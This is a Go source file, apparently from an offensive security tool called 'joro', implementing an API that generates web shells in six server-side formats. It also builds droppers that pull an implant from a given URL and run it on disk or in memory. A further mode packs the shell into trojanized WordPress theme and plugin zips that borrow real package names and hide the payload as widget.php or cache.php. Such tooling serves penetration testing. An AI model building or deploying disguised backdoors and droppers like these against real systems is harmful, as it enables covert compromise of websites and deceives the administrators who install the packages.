package api

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/fs"
	"net/http"
	"net/url"
	"path/filepath"
	"strings"

	"github.com/BishopFox/joro/internal/shell"
	"github.com/BishopFox/joro/internal/templates"
)

const (
	WPThemeArchiveRoot      = "envo-royal"
	WPPluginArchiveRoot     = "wp-ajaxify-comments"
	WPThemeArchive          = "envo-royal.1.0.14.zip"
	WPPluginArchive         = "wp-ajaxify-comments.3.2.2.zip"
	WPThemePayloadFileName  = "widget.php"
	WPPluginPayloadFileName = "cache.php"
	WPThemePayloadPath      = "extra"
	WPPluginPayloadPath     = "lib/composer"
)

// GenerateRequest represents the body payload of a shell or dropper generation request.
type GenerateRequest struct {
	Format             string `json:"format"`
	Mode               string `json:"mode"`       // "webshell" (default) | "dropper" | "wordpress"
	ImplantURL         string `json:"implantUrl"` // required when mode=dropper
	BinaryName         string `json:"binaryName"` // required when mode=dropper && !inMemory
	InMemory           bool   `json:"inMemory"`   // execute in memory without writing to disk
	HarpyToken         string `json:"harpyToken"`
	PayloadFileName    string `json:"payloadFileName"`
	WPArchiveName      string `json:"archiveName"`
	WPPayloadDirectory string `json:"payloadDirectory"`
	WPArchiveRootDir   string `json:"archiveRootDir"`
}

func (s *APIServer) handleGenerate(w http.ResponseWriter, r *http.Request) {
	var body GenerateRequest
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		writeError(w, http.StatusBadRequest, "invalid JSON")
		return
	}

	format := strings.ToLower(strings.TrimSpace(body.Format))
	mode := strings.ToLower(strings.TrimSpace(body.Mode))
	if mode == "" {
		mode = "webshell"
	}

	if mode != "webshell" && mode != "dropper" && mode != "wordpress" {
		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported mode %q; use webshell, dropper, or wordpress", mode))
		return
	}

	packaging := "none"
	if mode == "wordpress" {
		packaging = format
		// Force underlying format to php for package mode
		format = "php"

		// Pre-determine default values based on packaging type to avoid nested conditions
		var defaultPayloadDir string
		var defaultArchiveName string
		var defaultArchiveRootDir string
		var defaultPayloadFileName string

		switch packaging {
		case "theme":
			defaultPayloadDir = WPThemePayloadPath
			defaultArchiveName = WPThemeArchive
			defaultArchiveRootDir = WPThemeArchiveRoot
			defaultPayloadFileName = WPThemePayloadFileName
		case "plugin":
			defaultPayloadDir = WPPluginPayloadPath
			defaultArchiveName = WPPluginArchive
			defaultArchiveRootDir = WPPluginArchiveRoot
			defaultPayloadFileName = WPPluginPayloadFileName
		default:
			writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported wordpress package type %q; use theme or plugin", packaging))
			return
		}

		if body.PayloadFileName == "" {
			body.PayloadFileName = defaultPayloadFileName
		}
		if body.WPPayloadDirectory == "" {
			body.WPPayloadDirectory = defaultPayloadDir
		}
		if body.WPArchiveName == "" {
			body.WPArchiveName = defaultArchiveName
		}
		if body.WPArchiveRootDir == "" {
			body.WPArchiveRootDir = defaultArchiveRootDir
		}
	}

	if mode == "dropper" {
		s.handleGenerateDropper(w, format, body.ImplantURL, body.BinaryName, body.InMemory, body.HarpyToken)
		return
	}

	var (
		content string
		authKey string
		err     error
		ext     string
	)

	switch format {
	case "asp":
		content, authKey, err = shell.GenerateASP()
		ext = "asp"
	case "aspx":
		content, authKey, err = shell.GenerateASPX()
		ext = "aspx"
	case "ashx":
		content, authKey, err = shell.GenerateASHX()
		ext = "ashx"
	case "php":
		content, authKey, err = shell.GeneratePHP()
		ext = "php"
	case "jsp":
		content, authKey, err = shell.GenerateJSP()
		ext = "jsp"
	case "cfm":
		content, authKey, err = shell.GenerateCFM()
		ext = "cfm"
	default:
		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported format %q; use asp, ashx, aspx, cfm, jsp, or php", format))
		return
	}

	if err != nil {
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("generating shell: %v", err))
		return
	}

	fileName := "joro." + ext
	var finalContent = content
	var finalName = fileName

	if mode == "wordpress" {
		var err error
		finalContent, finalName, err = handleGenerateWordPressPack(content, body.PayloadFileName, packaging, body.WPArchiveName, body.WPPayloadDirectory, body.WPArchiveRootDir)
		if err != nil {
			writeError(w, http.StatusInternalServerError, fmt.Sprintf("packaging shell: %v", err))
			return
		}
	}

	writeJSON(w, http.StatusOK, map[string]string{
		"fileName": finalName,
		"authKey":  authKey,
		"content":  base64.StdEncoding.EncodeToString([]byte(finalContent)),
	})
}

func (s *APIServer) handleGenerateDropper(w http.ResponseWriter, format, implantURL, binaryName string, inMemory bool, harpyToken string) {
	// Validate implant URL
	implantURL = strings.TrimSpace(implantURL)
	if implantURL == "" {
		writeError(w, http.StatusBadRequest, "implantUrl is required for dropper mode")
		return
	}
	u, err := url.Parse(implantURL)
	if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
		writeError(w, http.StatusBadRequest, "implantUrl must be a valid HTTP or HTTPS URL")
		return
	}

	// Validate binary name for disk mode
	if !inMemory {
		binaryName = strings.TrimSpace(binaryName)
		if binaryName == "" {
			writeError(w, http.StatusBadRequest, "binaryName is required for on-disk dropper mode")
			return
		}
	}

	var (
		content string
		authKey string
		ext     string
	)

	switch format {
	case "php":
		content, authKey, err = shell.GenerateDropperPHP(implantURL, binaryName, inMemory, harpyToken)
		ext = "php"
	case "asp":
		content, authKey, err = shell.GenerateDropperASP(implantURL, binaryName, inMemory, harpyToken)
		ext = "asp"
	case "aspx":
		content, authKey, err = shell.GenerateDropperASPX(implantURL, binaryName, inMemory, harpyToken)
		ext = "aspx"
	case "ashx":
		content, authKey, err = shell.GenerateDropperASHX(implantURL, binaryName, inMemory, harpyToken)
		ext = "ashx"
	case "jsp":
		content, authKey, err = shell.GenerateDropperJSP(implantURL, binaryName, inMemory, harpyToken)
		ext = "jsp"
	case "cfm":
		content, authKey, err = shell.GenerateDropperCFM(implantURL, binaryName, inMemory, harpyToken)
		ext = "cfm"
	default:
		writeError(w, http.StatusBadRequest, fmt.Sprintf("unsupported format %q; use asp, ashx, aspx, cfm, jsp, or php", format))
		return
	}

	if err != nil {
		writeError(w, http.StatusInternalServerError, fmt.Sprintf("generating dropper: %v", err))
		return
	}

	writeJSON(w, http.StatusOK, map[string]string{
		"fileName": "joro-dropper." + ext,
		"authKey":  authKey,
		"content":  base64.StdEncoding.EncodeToString([]byte(content)),
	})
}

func handleGenerateWordPressPack(content, payloadFileName, wpType, archiveName, payloadDirectory, archiveRootDir string) (string, string, error) {
	if wpType != "theme" && wpType != "plugin" {
		return content, payloadFileName, nil
	}

	// Reject path traversal attempts for zip entry paths
	if strings.Contains(payloadFileName, "..") {
		return "", "", fmt.Errorf("payload filename cannot contain path traversal components")
	}
	if strings.Contains(payloadDirectory, "..") {
		return "", "", fmt.Errorf("payload directory cannot contain path traversal components")
	}
	if strings.Contains(archiveRootDir, "..") {
		return "", "", fmt.Errorf("archive root directory cannot contain path traversal components")
	}

	// Sanitize and normalize relative paths inside the zip archive (must use forward slashes)
	payloadDirectory = filepath.ToSlash(filepath.Clean(payloadDirectory))
	if payloadDirectory == "." || payloadDirectory == "/" {
		payloadDirectory = ""
	} else if payloadDirectory != "" {
		payloadDirectory = strings.Trim(payloadDirectory, "/") + "/"
	}

	archiveRootDir = filepath.ToSlash(filepath.Clean(archiveRootDir))
	if archiveRootDir == "." || archiveRootDir == "/" {
		archiveRootDir = ""
	} else if archiveRootDir != "" {
		archiveRootDir = strings.Trim(archiveRootDir, "/") + "/"
	}

	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)

	if payloadDirectory != "" {
		if !strings.HasPrefix(payloadFileName, payloadDirectory) {
			payloadFileName = payloadDirectory + payloadFileName
		}
	}
	if archiveRootDir != "" {
		payloadFileName = archiveRootDir + payloadFileName
	}

	fw, err := zw.Create(payloadFileName)
	if err != nil {
		return "", "", err
	}
	if _, err := fw.Write([]byte(content)); err != nil {
		return "", "", err
	}

	templateDir := "wp_" + wpType

	// Add the embedded files from internal/templates
	err = fs.WalkDir(templates.PackageFS, templateDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() {
			return nil
		}

		// Read file from embed.FS
		fileContent, err := templates.PackageFS.ReadFile(path)
		if err != nil {
			return err
		}

		// Calculate relative path within the zip, stripping the template root folder
		relPath, err := filepath.Rel(templateDir, path)
		if err != nil {
			return err
		}

		if archiveRootDir != "" {
			relPath = archiveRootDir + relPath
		}

		zwFile, err := zw.Create(relPath)
		if err != nil {
			return err
		}
		if _, err := zwFile.Write(fileContent); err != nil {
			return err
		}
		return nil
	})

	if err != nil {
		return "", "", err
	}

	if err := zw.Close(); err != nil {
		return "", "", err
	}

	if archiveName == "" {
		switch wpType {
		case "theme":
			archiveName = WPThemeArchive
		case "plugin":
			archiveName = WPPluginArchive
		default:
			parts := strings.Split(filepath.Base(payloadFileName), ".")
			archiveName = parts[0] + ".zip"
		}
	}
	if !strings.HasSuffix(archiveName, ".zip") {
		archiveName += ".zip"
	}

	return buf.String(), archiveName, nil
}
